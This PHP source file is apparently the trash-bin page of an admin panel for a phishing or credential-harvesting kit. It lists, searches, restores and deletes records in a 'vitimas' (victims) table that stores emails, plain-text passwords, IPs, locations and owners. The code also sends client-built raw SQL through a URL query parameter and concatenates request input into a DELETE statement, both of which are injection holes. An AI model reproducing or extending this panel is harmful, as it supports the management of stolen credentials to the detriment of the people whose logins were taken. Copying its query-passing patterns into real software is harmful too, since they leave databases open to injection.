<style type="text/css">
	.topo{
		width: 100%;
		position: relative;
		display: flex;
		margin-bottom: 4px;
	}
	 .ordem{
		padding: 18px 10px;
		text-align: right;
		display: inline-block;
	}
	.pesquisa{
		width: 240px;
		position: relative;
		padding: 10px 0px;
		float: left;
	}
	.lista{margin-bottom: 20px;}
	.lista .icons{
		margin: 0px 5px;float: right;
		cursor: pointer;font-weight: bold;
	}
	.lista .icons:hover{
		color: red;
	}
</style>
<?php
if (isset($_GET['ordem']) && !empty($_GET['ordem'])) {
	if ($_GET['ordem'] == "novos" || $_GET['ordem'] == "antigos") {
		$ordem = $_GET['ordem'];
	}
	else{ 
		$ordem = "novos";
	}
}else{
	$ordem = "novos";
}
switch ($ordem) {
	case 'novos':
	$ordem = "DESC";
	break;
	case 'antigos':
		$ordem = "ASC"; 
	break;
}
// deletar
if (isset($_GET['dell'])) {
	$priv = anti_injection($_GET['dell']);
	$query = "DELETE FROM vitimas WHERE id = ".$priv."  ";
	executa_query($query);
}
?>
<div>
	<h1>Lixeira</h1>
	<h5>Vitimas excluidas foram enviadas pra cá</h5>
</div>
<div class="topo">
	<form class="pesquisa" method="get">
		<input type="hidden" name="p" value="lixeira.php" /> 
		<?php
		if ($ordem != "novos") {
			?>
			<input type="hidden" value="antigos" name="ordem">
			<?php
		} ?>
		<input class="w3-input w3-border input_pesq" placeholder="Pesquisar no lixo" type="text" name="b">
	</form>
	<div class="ordem">
		<label>Ordem:</label>
		<select onchange="ordem();" id="ordem_select"><option <?php if(@$_GET['ordem']=="novos"){echo "selected";} ?> value="1">Novos</option><option <?php if(@$_GET['ordem']=="antigos"){echo "selected";} ?> value="0">Antigos</option></select>
	</div>
	<div class="ordem">
		<label>Total: <?php $query = "SELECT * FROM vitimas WHERE privacidade = 'lixo' ";if (executa_query($query)) {$total = mysqli_num_rows(executa_query($query));echo $total;}else{echo "0";} ?>

		</label>
	</div>
</div>

<form method="get" action="./" id="delllxk23" style="display:none;margin: 10 auto;padding: 15px;">
	<input type="hidden" name="p" value="lixeira.php">
	<input type="hidden" name="ordem" value="<?php echo @$_GET['ordem']; ?>">
	<input type="hidden" id="demo"  style="width: 400px;" name="dells">

	<button onclick="acao('restaurar')">Restaurar</button>
	<button onclick="acao('deletar')">Excluir</button>
</form>

<div class="w3-container lista">
  	<?php 
  	if (isset($_GET['b'])) {
  		echo "<h2><a href='./?p=lixeira.php' title='Sair da busca' > Voltar </a></h2>";
  	} ?>
  <ul class="w3-ul w3-card-4">
  	<?php
  	if (isset($_GET['b'])) {
  		$key = anti_injection($_GET['b']);
  		$buscaSql = " AND (id LIKE '%". $key ."%' OR email LIKE '%". $key ."%' OR senha LIKE '%". $key ."%' OR data LIKE '%". $key ."%' OR local LIKE '%". $key ."%' OR ip LIKE '%". $key ."%' OR dono LIKE '%". $key ."%') ";
  	}
	$ler = @ler_db("vitimas", "WHERE privacidade = 'lixo' ".@$buscaSql." ORDER BY id ".$ordem."");
	if (!empty($ler)) {
		foreach ($ler as $lers) {
		?>
		<li class="w3-display-container">
			<input type="checkbox" onclick="dell_check('<?php echo $lers['id']; ?>');" id="Vcheck_<?php echo $lers['id']; ?>"   >
	    	<span style="color: blue;">ID</span> 
	    	<span style="color: green;"><?php echo $lers['id']; ?></span> 
	    	<span style="color: blue;">DADOS</span> 
	    	<span style="color: green;"><?php echo $lers['email']." ";echo $lers['senha']  ?></span> 
	    	<span style="color: blue;">DONO</span> 
	    	<span style="color: green;"><?php echo $lers['dono']; ?></span> 
	    	<span class="icons" onclick="this.parentElement.style.display='none'" title="Ocultar temporariamente">-</span>
	    	<span class="icons" onclick="window.location.href='./?p=lixeira.php&dell=<?php echo $lers['id']; ?>';" title="Excluir permanentemente">X</span>
	    	<span class="icons" onclick="window.open('/vitimas/?id=<?php echo $lers['id']; ?>', '_blank');" title="Visualizar">+</span>
	    </li>
    	<?php 
		}
	}else{
	echo "Vazio";
	}
	?>
  </ul>
</div>
<script type="text/javascript">
function acao(oq){
	var demo = document.getElementById('demo');
	alert(demo.value);
	if (oq == "restaurar") {
		window.open("/admin/?p=db.php&query=UPDATE vitimas SET privacidade = 'privado' WHERE ("+demo.value+ ")", "minhaJanela", "height=200,width=200");
	}else{
		window.open("/admin/?p=db.php&query=DELETE FROM vitimas WHERE ("+demo.value+ ")", "minhaJanela", "height=200,width=200");
	}
			
}
function dell_check(id){
	document.getElementById("delllxk23").style.display = "block";
	var demo = document.getElementById('demo');
	if (document.getElementById('Vcheck_' + id ).checked == true) {
		if (demo.value == "") { 
			demo.value = "id = '"+id+"'";
		}else{
			demo.value = demo.value + " OR "+"id = '"+id+"'";
		}
	}else{
		if(demo.value.match("OR id = '"+id+"'")){
		  remove = demo.value.replace(" OR id = '"+id+"'", '');
		}else{
			remove = demo.value.replace("id = '"+id+"'", '');
		}

		demo.value = remove;
	}
	if (demo.value == "") { 
		document.getElementById("delllxk23").style.display = "none";
	}
}
function ordem(){
	if(document.getElementById('ordem_select').value =="1"){
		window.location.href="./?p=lixeira.php&ordem=novos&<?php if (isset($_GET['b'])) {echo "b=".anti_injection($_GET['b']);}?>";
	}else{
		window.location.href="./?p=lixeira.php&ordem=antigos&<?php if (isset($_GET['b'])) {echo "b=".anti_injection($_GET['b']);}?>";
	}
}
</script>
